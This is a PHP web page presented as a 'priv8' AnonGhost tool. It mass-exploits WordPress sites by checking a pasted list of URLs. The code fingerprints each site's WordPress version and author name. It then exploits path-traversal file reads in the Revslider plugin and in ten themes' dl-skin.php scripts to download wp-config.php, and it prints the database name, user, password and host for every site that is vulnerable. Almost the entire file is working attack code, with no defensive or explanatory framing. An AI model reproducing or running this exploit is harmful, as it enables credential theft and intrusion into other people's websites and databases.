<html>
    <body>
    <pre><p><center>
        <h2><font color="green">Wordpress ConfigAuto Exploiter Priv8 By AnonGhost</font></h2>
<h7>Like : https://www.facebook.com/pages/AnonGhost/353582141456952 </h7>
     <img src="http://computerandonlinesecurity.com/blog/wp-content/uploads/2009/12/WordPress-logo-broken.png" width=250 height=250>
   
 
        <pre>
            <form method='POST'>
        <textarea name='sites' cols='45' rows='15'></textarea>
            <input type='submit' value='READ CONFIG' /><br>
        </form>
   
   
    <?php
   
    @set_time_limit(0);
   
    $sites = explode("\r\n", $_POST['sites']);
   
    foreach($sites as $site) {
   
    $site = trim($site);
   
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$site");
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
    $get = curl_exec($ch);
    curl_close($ch);
            if(preg_match("#WordPress (.*?)/>#", $get, $version)){
            $str = str_replace('/>', "", $version[0]);
            $str = str_replace('"', "", $str);
            }
            $users = @file_get_contents("$site/?author=1");
            preg_match('/<title>(.*?)<\/title>/si',$users,$user);
           
    echo " <br>-----------------------------------</br>";
    echo "<font color='blue'>$site</font><br>";
         
         
   
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php");
    curl_setopt($ch, CURLOPT_HTTPGET, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
    $xp = curl_exec ($ch);
    curl_close($ch);
    if(preg_match("#DB_USER#i",$xp)){
    preg_match("#'DB_NAME', '(.*?)'#i",$xp,$DB_NAME);
    echo "<font color='green'>DB_NAME:</font><font color='red'>{$DB_NAME[1]}</font><br>";
    preg_match("#'DB_USER', '(.*?)'#i",$xp,$DB_USER);
    echo "<font color='green'>DB_USER:</font><font color='red'>{$DB_USER[1]}</font><br>";
    preg_match("#'DB_PASSWORD', '(.*?)'#i",$xp,$DB_PASSWORD);
    echo "<font color='green'>DB_PASSWORD:</font><font color='red'>{$DB_PASSWORD[1]}</font><br>";
    preg_match("#'DB_HOST', '(.*?)'#i",$xp,$DB_HOST);
    echo "<font color='green'>DB_HOST:</font><font color='red'>{$DB_HOST[1]}</font><br>";
   
    }
   
    $lt = array("wp-content/themes/construct/lib/scripts/dl-skin.php","wp-content/themes/persuasion/lib/scripts/dl-skin.php","wp-content/themes/manbiz2/lib/scripts/dl-skin.php","wp-content/themes/method/lib/scripts/dl-skin.php","wp-content/themes/elegance/lib/scripts/dl-skin.php","wp-content/themes/modular/lib/scripts/dl-skin.php","wp-content/themes/myriad/lib/scripts/dl-skin.php","wp-content/themes/echelon/lib/scripts/dl-skin.php","wp-content/themes/fusion/lib/scripts/dl-skin.php","wp-content/themes/awake/lib/scripts/dl-skin.php");
            foreach($lt as $l){
            $site = "$site/$l";
    $process = curl_init($site);
    curl_setopt($process, CURLOPT_TIMEOUT, 30);
    curl_setopt($process, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)");
    curl_setopt($process, CURLOPT_HEADER, TRUE);
    curl_setopt($process, CURLOPT_POST, 1);
    curl_setopt($process, CURLOPT_POSTFIELDS, "_mysite_download_skin=../../../../../wp-config.php");
    curl_setopt($process, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($process, CURLOPT_FOLLOWLOCATION, 1);
    $return = curl_exec($process);
    if(preg_match("#DB_USER#i",$return)){
    preg_match("#'DB_NAME', '(.*?)'#i",$return,$DB_NAME);
    echo "DB_NAME:{$DB_NAME[1]}<br>";
    preg_match("#'DB_USER', '(.*?)'#i",$return,$DB_USER);
    echo "DB_USER:{$DB_USER[1]}<br>";
    preg_match("#'DB_PASSWORD', '(.*?)'#i",$return,$DB_PASSWORD);
    echo "DB_PASSWORD:{$DB_PASSWORD[1]}<br>";
    preg_match("#'DB_HOST', '(.*?)'#i",$return,$DB_HOST);
    echo "DB_HOST:{$DB_HOST[1]}<br>";
    break;
    echo " <br>-----------------------------------</br>";
    ob_implicit_flush(true);
    ob_end_flush();
    }
    }
    }
   
   
   
   
   
   
    ?>
    </pre></p></center>